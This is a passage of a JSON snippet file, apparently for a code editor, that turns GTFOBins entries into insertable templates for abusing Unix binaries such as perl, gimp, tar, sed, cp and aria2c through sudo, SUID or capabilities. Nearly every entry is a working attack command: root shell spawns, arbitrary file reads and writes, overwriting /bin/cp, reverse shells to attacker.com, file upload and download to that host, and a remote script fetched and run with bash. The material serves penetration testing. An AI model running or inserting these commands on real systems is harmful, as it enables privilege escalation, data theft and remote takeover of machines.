            "abuse arj with sudo, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "sudo arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with sudo - The archive can also be prepared offline then uploaded."
    },
    "arj suid (gtfobins)": {
        "prefix": "arj suid",
        "body": [
            "abuse arj with suid, The archive can also be prepared offline then uploaded.",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "LFILE=${1:file_to_write}",
            "LDIR=where_to_write",
            "echo DATA >\"\\$TF/\\$LFILE\"",
            "arj a \"\\$TF/a\" \"\\$TF/\\$LFILE\"",
            "./arj e \"\\$TF/a\" \\$LDIR${0}",
            "```"
        ],
        "description": "abuse arj with suid - The archive can also be prepared offline then uploaded."
    },
    "cp file-read (gtfobins)": {
        "prefix": "cp file-read",
        "body": [
            "abuse cp with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cp \"\\$LFILE\" /dev/stdout${0}",
            "```"
        ],
        "description": "abuse cp with file-read"
    },
    "cp file-write (gtfobins)": {
        "prefix": "cp file-write",
        "body": [
            "abuse cp with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo \"DATA\" | cp /dev/stdin \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cp with file-write"
    },
    "cp suid (gtfobins)": {
        "prefix": "cp suid",
        "body": [
            "abuse cp with suid, This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.",
            "",
            "```sh",
            "LFILE=${1:file_to_change}",
            "./cp --attributes-only --preserve=all ./cp \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cp with suid - This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another."
    },
    "cp sudo (gtfobins)": {
        "prefix": "cp sudo",
        "body": [
            "abuse cp with sudo, This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.",
            "",
            "```sh",
            "sudo cp /bin/sh /bin/cp",
            "sudo cp${0}",
            "```"
        ],
        "description": "abuse cp with sudo - This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action."
    },
    "lualatex shell (gtfobins)": {
        "prefix": "lualatex shell",
        "body": [
            "abuse lualatex with shell",
            "",
            "```sh",
            "lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with shell"
    },
    "lualatex sudo (gtfobins)": {
        "prefix": "lualatex sudo",
        "body": [
            "abuse lualatex with sudo",
            "",
            "```sh",
            "sudo lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with sudo"
    },
    "lualatex limited-suid (gtfobins)": {
        "prefix": "lualatex limited-suid",
        "body": [
            "abuse lualatex with limited-suid",
            "",
            "```sh",
            "./lualatex -shell-escape '\\documentclass{article}\\begin{document}\\directlua{os.execute(\"/bin/sh\")}\\end{document}'${0}",
            "```"
        ],
        "description": "abuse lualatex with limited-suid"
    },
    "luatex shell (gtfobins)": {
        "prefix": "luatex shell",
        "body": [
            "abuse luatex with shell",
            "",
            "```sh",
            "luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with shell"
    },
    "luatex sudo (gtfobins)": {
        "prefix": "luatex sudo",
        "body": [
            "abuse luatex with sudo",
            "",
            "```sh",
            "sudo luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with sudo"
    },
    "luatex limited-suid (gtfobins)": {
        "prefix": "luatex limited-suid",
        "body": [
            "abuse luatex with limited-suid",
            "",
            "```sh",
            "./luatex -shell-escape '\\directlua{os.execute(\"/bin/sh\")}\\end'${0}",
            "```"
        ],
        "description": "abuse luatex with limited-suid"
    },
    "gimp shell (gtfobins)": {
        "prefix": "gimp shell",
        "body": [
            "abuse gimp with shell",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with shell"
    },
    "gimp reverse-shell (gtfobins)": {
        "prefix": "gimp reverse-shell",
        "body": [
            "abuse gimp with reverse-shell, Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()",
            "s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))",
            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]",
            "pty.spawn(\"/bin/sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with reverse-shell - Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
    },
    "gimp file-upload (gtfobins)": {
        "prefix": "gimp file-upload",
        "body": [
            "abuse gimp with file-upload, Serve files in the local folder running an HTTP server.",
            "",
            "```sh",
            "export LPORT=8888",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import http.server as s, socketserver as ss",
            "else: import SimpleHTTPServer as s, SocketServer as ss",
            "ss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'${0}",
            "```"
        ],
        "description": "abuse gimp with file-upload - Serve files in the local folder running an HTTP server."
    },
    "gimp file-download (gtfobins)": {
        "prefix": "gimp file-download",
        "body": [
            "abuse gimp with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "export URL=http://${2:attacker.com}/file_to_get",
            "export LFILE=${1:file_to_save}",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e",
            "if sys.version_info.major == 3: import urllib.request as r",
            "else: import urllib as r",
            "r.urlretrieve(e[\"URL\"], e[\"LFILE\"])'${0}",
            "```"
        ],
        "description": "abuse gimp with file-download - Fetch a remote file via HTTP GET request."
    },
    "gimp file-write (gtfobins)": {
        "prefix": "gimp file-write",
        "body": [
            "abuse gimp with file-write",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"${1:file_to_write}\", \"wb\").write(\"DATA\")'${0}",
            "```"
        ],
        "description": "abuse gimp with file-write"
    },
    "gimp file-read (gtfobins)": {
        "prefix": "gimp file-read",
        "body": [
            "abuse gimp with file-read",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"${1:file_to_read}\").read())'${0}",
            "```"
        ],
        "description": "abuse gimp with file-read"
    },
    "gimp library-load (gtfobins)": {
        "prefix": "gimp library-load",
        "body": [
            "abuse gimp with library-load",
            "",
            "```sh",
            "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'${0}",
            "```"
        ],
        "description": "abuse gimp with library-load"
    },
    "gimp suid (gtfobins)": {
        "prefix": "gimp suid",
        "body": [
            "abuse gimp with suid",
            "",
            "```sh",
            "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${0}",
            "```"
        ],
        "description": "abuse gimp with suid"
    },
    "gimp sudo (gtfobins)": {
        "prefix": "gimp sudo",
        "body": [
            "abuse gimp with sudo",
            "",
            "```sh",
            "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'${0}",
            "```"
        ],
        "description": "abuse gimp with sudo"
    },
    "c99 file-read (gtfobins)": {
        "prefix": "c99 file-read",
        "body": [
            "abuse c99 with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "c99 -x c -E \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse c99 with file-read"
    },
    "c99 file-write (gtfobins)": {
        "prefix": "c99 file-write",
        "body": [
            "abuse c99 with file-write",
            "",
            "```sh",
            "LFILE=file_to_delete",
            "c99 -xc /dev/null -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse c99 with file-write"
    },
    "c99 shell (gtfobins)": {
        "prefix": "c99 shell",
        "body": [
            "abuse c99 with shell",
            "",
            "```sh",
            "c99 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c99 with shell"
    },
    "c99 sudo (gtfobins)": {
        "prefix": "c99 sudo",
        "body": [
            "abuse c99 with sudo",
            "",
            "```sh",
            "sudo c99 -wrapper /bin/sh,-s .${0}",
            "```"
        ],
        "description": "abuse c99 with sudo"
    },
    "chroot suid (gtfobins)": {
        "prefix": "chroot suid",
        "body": [
            "abuse chroot with suid",
            "",
            "```sh",
            "./chroot / /bin/sh -p${0}",
            "```"
        ],
        "description": "abuse chroot with suid"
    },
    "chroot sudo (gtfobins)": {
        "prefix": "chroot sudo",
        "body": [
            "abuse chroot with sudo",
            "",
            "```sh",
            "sudo chroot /${0}",
            "```"
        ],
        "description": "abuse chroot with sudo"
    },
    "xmodmap file-read (gtfobins)": {
        "prefix": "xmodmap file-read",
        "body": [
            "abuse xmodmap with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with file-read"
    },
    "xmodmap suid (gtfobins)": {
        "prefix": "xmodmap suid",
        "body": [
            "abuse xmodmap with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with suid"
    },
    "xmodmap sudo (gtfobins)": {
        "prefix": "xmodmap sudo",
        "body": [
            "abuse xmodmap with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo xmodmap -v \\$LFILE${0}",
            "```"
        ],
        "description": "abuse xmodmap with sudo"
    },
    "pandoc file-read (gtfobins)": {
        "prefix": "pandoc file-read",
        "body": [
            "abuse pandoc with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "pandoc -t plain \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with file-read"
    },
    "pandoc file-write (gtfobins)": {
        "prefix": "pandoc file-write",
        "body": [
            "abuse pandoc with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | pandoc -t plain -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with file-write"
    },
    "pandoc shell (gtfobins)": {
        "prefix": "pandoc shell",
        "body": [
            "abuse pandoc with shell, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with shell - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "pandoc suid (gtfobins)": {
        "prefix": "pandoc suid",
        "body": [
            "abuse pandoc with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "echo DATA | ./pandoc -t plain -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse pandoc with suid"
    },
    "pandoc limited-suid (gtfobins)": {
        "prefix": "pandoc limited-suid",
        "body": [
            "abuse pandoc with limited-suid, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "./pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with limited-suid - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "pandoc sudo (gtfobins)": {
        "prefix": "pandoc sudo",
        "body": [
            "abuse pandoc with sudo, Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo 'os.execute(\"/bin/sh\")' >\\$TF",
            "sudo pandoc -L \\$TF /dev/null${0}",
            "```"
        ],
        "description": "abuse pandoc with sudo - Pandoc has a builtin [`lua`](/gtfobins/lua/) interpreter for writing filters, other functions might apply."
    },
    "perl shell (gtfobins)": {
        "prefix": "perl shell",
        "body": [
            "abuse perl with shell",
            "",
            "```sh",
            "perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with shell"
    },
    "perl file-read (gtfobins)": {
        "prefix": "perl file-read",
        "body": [
            "abuse perl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "perl -ne print \\$LFILE${0}",
            "```"
        ],
        "description": "abuse perl with file-read"
    },
    "perl reverse-shell (gtfobins)": {
        "prefix": "perl reverse-shell",
        "body": [
            "abuse perl with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell.",
            "",
            "```sh",
            "export RHOST=${1:attacker.com}",
            "export RPORT=${2:12345}",
            "perl -e 'use Socket;\\$i=\"\\$ENV{RHOST}\";\\$p=\\$ENV{RPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\\$p,inet_aton(\\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${0}",
            "```"
        ],
        "description": "abuse perl with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell."
    },
    "perl suid (gtfobins)": {
        "prefix": "perl suid",
        "body": [
            "abuse perl with suid",
            "",
            "```sh",
            "./perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with suid"
    },
    "perl sudo (gtfobins)": {
        "prefix": "perl sudo",
        "body": [
            "abuse perl with sudo",
            "",
            "```sh",
            "sudo perl -e 'exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with sudo"
    },
    "perl capabilities (gtfobins)": {
        "prefix": "perl capabilities",
        "body": [
            "abuse perl with capabilities",
            "",
            "```sh",
            "./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/sh\";'${0}",
            "```"
        ],
        "description": "abuse perl with capabilities"
    },
    "mtr file-read (gtfobins)": {
        "prefix": "mtr file-read",
        "body": [
            "abuse mtr with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mtr --raw -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mtr with file-read"
    },
    "mtr sudo (gtfobins)": {
        "prefix": "mtr sudo",
        "body": [
            "abuse mtr with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo mtr --raw -F \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mtr with sudo"
    },
    "sort file-read (gtfobins)": {
        "prefix": "sort file-read",
        "body": [
            "abuse sort with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with file-read"
    },
    "sort suid (gtfobins)": {
        "prefix": "sort suid",
        "body": [
            "abuse sort with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with suid"
    },
    "sort sudo (gtfobins)": {
        "prefix": "sort sudo",
        "body": [
            "abuse sort with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo sort -m \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sort with sudo"
    },
    "man shell (gtfobins)": {
        "prefix": "man shell",
        "body": [
            "abuse man with shell, This only works for GNU `man` and requires GNU `troff` (`groff` to be installed).",
            "",
            "```sh",
            "man '-H/bin/sh #' man${0}",
            "```"
        ],
        "description": "abuse man with shell - This only works for GNU `man` and requires GNU `troff` (`groff` to be installed)."
    },
    "man file-read (gtfobins)": {
        "prefix": "man file-read",
        "body": [
            "abuse man with file-read",
            "",
            "```sh",
            "man ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse man with file-read"
    },
    "man sudo (gtfobins)": {
        "prefix": "man sudo",
        "body": [
            "abuse man with sudo",
            "",
            "```sh",
            "sudo man man",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse man with sudo"
    },
    "cat file-read (gtfobins)": {
        "prefix": "cat file-read",
        "body": [
            "abuse cat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with file-read"
    },
    "cat suid (gtfobins)": {
        "prefix": "cat suid",
        "body": [
            "abuse cat with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with suid"
    },
    "cat sudo (gtfobins)": {
        "prefix": "cat sudo",
        "body": [
            "abuse cat with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo cat \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse cat with sudo"
    },
    "tar shell (gtfobins)": {
        "prefix": "tar shell",
        "body": [
            "abuse tar with shell, This only works for GNU tar. It can be useful when only a limited command argument injection is available.",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '/bin/sh 0<&1' > \"\\$TF\"",
            "tar cf \"\\$TF.tar\" \"\\$TF\"",
            "tar xf \"\\$TF.tar\" --to-command sh",
            "rm \"\\$TF\"*${0}",
            "```"
        ],
        "description": "abuse tar with shell - This only works for GNU tar. It can be useful when only a limited command argument injection is available."
    },
    "tar file-upload (gtfobins)": {
        "prefix": "tar file-upload",
        "body": [
            "abuse tar with file-upload, This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RUSER=root",
            "RFILE=/tmp/${1:file_to_send}.tar",
            "LFILE=${1:file_to_send}",
            "tar cvf \\$RUSER@\\$RHOST:\\$RFILE \\$LFILE --rsh-command=/bin/ssh${0}",
            "```"
        ],
        "description": "abuse tar with file-upload - This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)."
    },
    "tar file-download (gtfobins)": {
        "prefix": "tar file-download",
        "body": [
            "abuse tar with file-download, This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RUSER=root",
            "RFILE=/tmp/file_to_get.tar",
            "tar xvf \\$RUSER@\\$RHOST:\\$RFILE --rsh-command=/bin/ssh${0}",
            "```"
        ],
        "description": "abuse tar with file-download - This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions)."
    },
    "tar file-write (gtfobins)": {
        "prefix": "tar file-write",
        "body": [
            "abuse tar with file-write, This only works for GNU tar.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \"\\$TF\"",
            "tar c --xform \"s@.*@\\$LFILE@\" -OP \"\\$TF\" | tar x -P${0}",
            "```"
        ],
        "description": "abuse tar with file-write - This only works for GNU tar."
    },
    "tar file-read (gtfobins)": {
        "prefix": "tar file-read",
        "body": [
            "abuse tar with file-read, This only works for GNU tar.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tar xf \"\\$LFILE\" -I '/bin/sh -c \"cat 1>&2\"'${0}",
            "```"
        ],
        "description": "abuse tar with file-read - This only works for GNU tar."
    },
    "tar sudo (gtfobins)": {
        "prefix": "tar sudo",
        "body": [
            "abuse tar with sudo",
            "",
            "```sh",
            "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${0}",
            "```"
        ],
        "description": "abuse tar with sudo"
    },
    "tar limited-suid (gtfobins)": {
        "prefix": "tar limited-suid",
        "body": [
            "abuse tar with limited-suid",
            "",
            "```sh",
            "./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh${0}",
            "```"
        ],
        "description": "abuse tar with limited-suid"
    },
    "nft file-read (gtfobins)": {
        "prefix": "nft file-read",
        "body": [
            "abuse nft with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with file-read"
    },
    "nft suid (gtfobins)": {
        "prefix": "nft suid",
        "body": [
            "abuse nft with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with suid"
    },
    "nft sudo (gtfobins)": {
        "prefix": "nft sudo",
        "body": [
            "abuse nft with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo nft -f \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nft with sudo"
    },
    "msgcat file-read (gtfobins)": {
        "prefix": "msgcat file-read",
        "body": [
            "abuse msgcat with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with file-read"
    },
    "msgcat sudo (gtfobins)": {
        "prefix": "msgcat sudo",
        "body": [
            "abuse msgcat with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with sudo"
    },
    "msgcat suid (gtfobins)": {
        "prefix": "msgcat suid",
        "body": [
            "abuse msgcat with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./msgcat -P \\$LFILE${0}",
            "```"
        ],
        "description": "abuse msgcat with suid"
    },
    "sudo sudo (gtfobins)": {
        "prefix": "sudo sudo",
        "body": [
            "abuse sudo with sudo",
            "",
            "```sh",
            "sudo sudo /bin/sh${0}",
            "```"
        ],
        "description": "abuse sudo with sudo"
    },
    "dos2unix file-write (gtfobins)": {
        "prefix": "dos2unix file-write",
        "body": [
            "abuse dos2unix with file-write",
            "",
            "```sh",
            "LFILE1=${1:file_to_read}",
            "LFILE2=${2:file_to_write}",
            "dos2unix -f -n \"\\$LFILE1\" \"\\$LFILE2\"${0}",
            "```"
        ],
        "description": "abuse dos2unix with file-write"
    },
    "aria2c command (gtfobins)": {
        "prefix": "aria2c command",
        "body": [
            "abuse aria2c with command, The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID.",
            "",
            "```sh",
            "aria2c --allow-overwrite --gid=aaaaaaaaaaaaaaaa --on-download-complete=bash http://${1:attacker.com}/aaaaaaaaaaaaaaaa${0}",
            "```"
        ],
        "description": "abuse aria2c with command - The remote file `aaaaaaaaaaaaaaaa` (must be a string of 16 hex digit) contains the shell script. Note that said file needs to be written on disk in order to be executed. `--allow-overwrite` is needed if this is executed multiple times with the same GID."
    },
    "aria2c file-download (gtfobins)": {
        "prefix": "aria2c file-download",
        "body": [
            "abuse aria2c with file-download, Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "aria2c -o \"\\$LFILE\" \"\\$URL\"${0}",
            "```"
        ],
        "description": "abuse aria2c with file-download - Fetch a remote file via HTTP GET request. Use `--allow-overwrite` if needed."
    },
    "aria2c sudo (gtfobins)": {
        "prefix": "aria2c sudo",
        "body": [
            "abuse aria2c with sudo",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "sudo aria2c --on-download-error=\\$TF http://x${0}",
            "```"
        ],
        "description": "abuse aria2c with sudo"
    },
    "aria2c limited-suid (gtfobins)": {
        "prefix": "aria2c limited-suid",
        "body": [
            "abuse aria2c with limited-suid",
            "",
            "```sh",
            "COMMAND='id'",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND\" > \\$TF",
            "chmod +x \\$TF",
            "./aria2c --on-download-error=\\$TF http://x${0}",
            "```"
        ],
        "description": "abuse aria2c with limited-suid"
    },
    "sqlmap shell (gtfobins)": {
        "prefix": "sqlmap shell",
        "body": [
            "abuse sqlmap with shell",
            "",
            "```sh",
            "sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"${0}",
            "```"
        ],
        "description": "abuse sqlmap with shell"
    },
    "sqlmap sudo (gtfobins)": {
        "prefix": "sqlmap sudo",
        "body": [
            "abuse sqlmap with sudo",
            "",
            "```sh",
            "sudo sqlmap -u 127.0.0.1 --eval=\"import os; os.system('/bin/sh')\"${0}",
            "```"
        ],
        "description": "abuse sqlmap with sudo"
    },
    "unzip sudo (gtfobins)": {
        "prefix": "unzip sudo",
        "body": [
            "abuse unzip with sudo",
            "",
            "```sh",
            "sudo unzip -K shell.zip",
            "./sh -p${0}",
            "```"
        ],
        "description": "abuse unzip with sudo"
    },
    "unzip suid (gtfobins)": {
        "prefix": "unzip suid",
        "body": [
            "abuse unzip with suid",
            "",
            "```sh",
            "./unzip -K shell.zip",
            "./sh -p${0}",
            "```"
        ],
        "description": "abuse unzip with suid"
    },
    "shuf file-read (gtfobins)": {
        "prefix": "shuf file-read",
        "body": [
            "abuse shuf with file-read, The read file content is corrupted by randomizing the order of NUL terminated strings.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "shuf -z \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with file-read - The read file content is corrupted by randomizing the order of NUL terminated strings."
    },
    "shuf file-write (gtfobins)": {
        "prefix": "shuf file-write",
        "body": [
            "abuse shuf with file-write, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with file-write - The written file content is corrupted by adding a newline."
    },
    "shuf suid (gtfobins)": {
        "prefix": "shuf suid",
        "body": [
            "abuse shuf with suid, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "./shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with suid - The written file content is corrupted by adding a newline."
    },
    "shuf sudo (gtfobins)": {
        "prefix": "shuf sudo",
        "body": [
            "abuse shuf with sudo, The written file content is corrupted by adding a newline.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sudo shuf -e DATA -o \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse shuf with sudo - The written file content is corrupted by adding a newline."
    },
    "sed shell (gtfobins)": {
        "prefix": "sed shell",
        "body": [
            "abuse sed with shell, GNU version only. The resulting shell is not a proper TTY shell.",
            "",
            "```sh",
            "sed e${0}",
            "```"
        ],
        "description": "abuse sed with shell - GNU version only. The resulting shell is not a proper TTY shell."
    },
    "sed command (gtfobins)": {
        "prefix": "sed command",
        "body": [
            "abuse sed with command, GNU version only.",
            "",
            "```sh",
            "sed -n '1e id' /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with command - GNU version only."
    },
    "sed file-write (gtfobins)": {
        "prefix": "sed file-write",
        "body": [
            "abuse sed with file-write",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "sed -n \"1s/.*/DATA/w \\$LFILE\" /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with file-write"
    },
    "sed file-read (gtfobins)": {
        "prefix": "sed file-read",
        "body": [
            "abuse sed with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sed '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sed with file-read"
    },
    "sed suid (gtfobins)": {
        "prefix": "sed suid",
        "body": [
            "abuse sed with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./sed -e '' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse sed with suid"
    },
    "sed sudo (gtfobins)": {
        "prefix": "sed sudo",
        "body": [
            "abuse sed with sudo, GNU version only. Also, this requires `bash`.",
            "",
            "```sh",
            "sudo sed -n '1e exec sh 1>&0' /etc/hosts${0}",
            "```"
        ],
        "description": "abuse sed with sudo - GNU version only. Also, this requires `bash`."
    },
    "ncdu shell (gtfobins)": {
        "prefix": "ncdu shell",
        "body": [
            "abuse ncdu with shell",
            "",
            "```sh",
            "ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with shell"
    },
    "ncdu sudo (gtfobins)": {
        "prefix": "ncdu sudo",
        "body": [
            "abuse ncdu with sudo",
            "",
            "```sh",
            "sudo ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with sudo"
    },
    "ncdu limited-suid (gtfobins)": {
        "prefix": "ncdu limited-suid",
        "body": [
            "abuse ncdu with limited-suid",
            "",
            "```sh",
            "./ncdu",
            "b${0}",
            "```"
        ],
        "description": "abuse ncdu with limited-suid"
    },
    "composer shell (gtfobins)": {
        "prefix": "composer shell",
        "body": [
            "abuse composer with shell",
            "",
            "```sh",
            "TF=\\$(mktemp -d)",
            "echo '{\"scripts\":{\"x\":\"/bin/sh -i 0<&3 1>&3 2>&3\"}}' >\\$TF/composer.json",
            "composer --working-dir=\\$TF run-script x${0}",
            "```"
        ],
        "description": "abuse composer with shell"
    },
